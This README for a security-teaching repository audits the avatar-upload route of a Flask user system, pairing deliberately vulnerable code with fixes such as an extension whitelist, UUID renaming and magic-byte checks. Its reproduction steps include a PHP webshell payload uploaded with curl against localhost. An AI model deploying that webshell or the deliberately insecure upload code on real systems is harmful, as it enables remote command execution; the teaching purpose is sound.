# Flask 用户管理系统 — 文件上传安全审计

## 项目简介

本项目是一个基于 Flask + SQLite3 的用户管理系统，提供了登录、注册、用户搜索、头像上传等基础功能。本仓库在原有系统基础上，专门针对**头像上传模块**进行安全审计与加固，包含漏洞源码、修复后源码、审计报告和配套教程，适用于网络安全课程实验教学。

## 运行环境

| 项目 | 版本 |
|------|------|
| Python | 3.10+ |
| Flask | 3.x |
| 数据库 | SQLite3 |
| 模板引擎 | Jinja2 |
| 前端 | HTML5 + CSS3 |

## 部署启动步骤

### 安装依赖

```bash
pip install flask werkzeug
```

### 启动漏洞版

```bash
cd vulnerable
python app.py
# 访问 http://127.0.0.1:5000
```

### 启动修复版

```bash
cd fixed
python app.py
# 访问 http://127.0.0.1:5000
```

> 默认登录账号：admin / admin123

## 目录结构

```
file-upload-audit/
├── 1-SECURITY_AUDIT.md              # 安全审计报告
├── vulnerable/                       # 漏洞原版代码
│   ├── app_upload_section.py        # app.py 上传路由部分（漏洞版）
│   ├── upload.html                  # 上传页面模板
│   ├── base.html                    # 基础模板
│   └── index.html                   # 首页模板
├── fixed/                            # 安全修复版代码
│   ├── app_upload_section.py        # app.py 上传路由部分（修复版）
│   ├── upload.html                  # 上传页面模板
│   ├── base.html                    # 基础模板
│   └── index.html                   # 首页模板
└── README.md                         # 本文件
```

## 基础功能说明

| 路由 | 方法 | 功能 | 登录要求 |
|------|------|------|---------|
| `/` | GET | 首页，展示用户信息 | 否 |
| `/login` | GET/POST | 用户登录 | 否 |
| `/register` | GET/POST | 用户注册 | 否 |
| `/search` | GET | 搜索用户 | 是 |
| `/upload` | GET/POST | 上传头像 | 是 |
| `/logout` | GET | 退出登录 | 否 |

---

## 漏洞原版源码介绍

漏洞版代码位于 `vulnerable/` 目录，上传路由 `app_upload_section.py` 中的关键缺陷：

```python
# 漏洞1：无扩展名校验
# 漏洞2：无内容校验
# 漏洞3：原始文件名保存
filename = secure_filename(file.filename)
file.save(os.path.join(UPLOAD_FOLDER, filename))
```

---

## 详细漏洞审计

详见 `1-SECURITY_AUDIT.md`，共发现 4 项漏洞：

| 编号 | 漏洞名称 | 等级 |
|------|---------|------|
| VUL-FU-01 | 任意文件上传（无后缀校验） | 高危 |
| VUL-FU-02 | 文件覆盖（同名互相覆盖） | 中危 |
| VUL-FU-03 | 无文件内容真实性校验 | 中危 |
| VUL-FU-04 | 文件体积上限过大（16MB） | 低危 |

---

## 漏洞复现操作教程

### 前置条件

启动漏洞版服务，登录获取 session cookie。

### 复现 VUL-FU-01：上传 Webshell

```bash
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/shell.php"
```

**预期结果：** 非图片文件上传成功，可通过 `/static/uploads/` 直接访问。

### 复现 VUL-FU-02：文件覆盖

```bash
echo "content-A" > /tmp/test.png
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/test.png"
echo "content-B" > /tmp/test.png
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/test.png"
```

**预期结果：** 第二次上传覆盖第一次的文件内容。

### 复现 VUL-FU-03：非图片伪装上传

```bash
echo "not-a-real-image" > /tmp/fake.png
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/fake.png"
```

### 复现 VUL-FU-04：大文件上传

```bash
dd if=/dev/zero of=/tmp/bigfile.jpg bs=1M count=15
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/bigfile.jpg"
```

---

## 安全修复方案

修复版代码位于 `fixed/` 目录，修复措施对照表：

| 漏洞 | 修复方式 | 代码位置 |
|------|---------|---------|
| VUL-FU-01 任意文件上传 | 添加扩展名白名单 | `ALLOWED_EXTENSIONS` |
| VUL-FU-02 文件覆盖 | UUID 重命名 | `uuid.uuid4().hex + ext` |
| VUL-FU-03 非图片伪装 | 魔术头校验 | `_validate_image_content()` |
| VUL-FU-04 体积过大 | 上限从 16MB 降至 5MB | `app.config["MAX_CONTENT_LENGTH"]` |

### 修复前后对比

| 对比项 | 漏洞版 | 修复版 |
|--------|-------|-------|
| 文件扩展名校验 | 无，允许 .php/.py/.html | 白名单，仅允许 JPG/PNG/GIF/WebP |
| 文件内容校验 | 无，文本伪装图片可上传 | 魔术头校验，非图片格式被拒绝 |
| 文件名策略 | 原始文件名，同名覆盖 | UUID 唯一化，互不影响 |
| 文件大小限制 | 上限 16MB | 上限 5MB |
| 上传 .php 文件 | 成功保存至服务器 | 返回"不支持的文件格式" |
| 上传文本伪装 .png | 上传成功 | 返回"文件内容并非有效图片" |

### 修复代码核心片段

```python
# 扩展名白名单
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp"}

# 魔术头校验函数
def _validate_image_content(filepath):
    with open(filepath, "rb") as f:
        header = f.read(12)
    return (header.startswith(b"\xff\xd8\xff") or
            header.startswith(b"\x89PNG\r\n\x1a\n") or
            header.startswith(b"GIF87a") or
            header.startswith(b"GIF89a") or
            (header.startswith(b"RIFF") and header[8:12] == b"WEBP"))

# 上传流程
ext = os.path.splitext(original_name)[1].lower()
if ext not in ALLOWED_EXTENSIONS:
    return render_template("upload.html", error="不支持的文件格式")
unique_name = f"{uuid.uuid4().hex}{ext}"
if not _validate_image_content(save_path):
    os.remove(save_path)
    return render_template("upload.html", error="文件内容无效")
```

---

## 服务器加固建议

1. **禁用脚本执行**：`static/uploads/` 目录关闭脚本执行权限
2. **隔离域**：上传目录使用独立静态资源域名
3. **防盗链**：配置 Referer 验证防止资源被第三方滥用
4. **定期清理**：清理长时间未使用的上传文件
5. **WAF 防护**：部署 ModSecurity 等 WAF 检测恶意文件上传

---

## 网络安全学习免责声明

本仓库提供的漏洞代码和 POC 测试命令仅用于 **网络安全教学与合法授权测试**。禁止用于未经授权的系统测试或攻击，任何非法使用造成的法律后果由使用者自行承担。请遵守《中华人民共和国网络安全法》及相关法律法规。

---

*项目维护者：网络安全实训小组 | 最后更新：2026年7月*
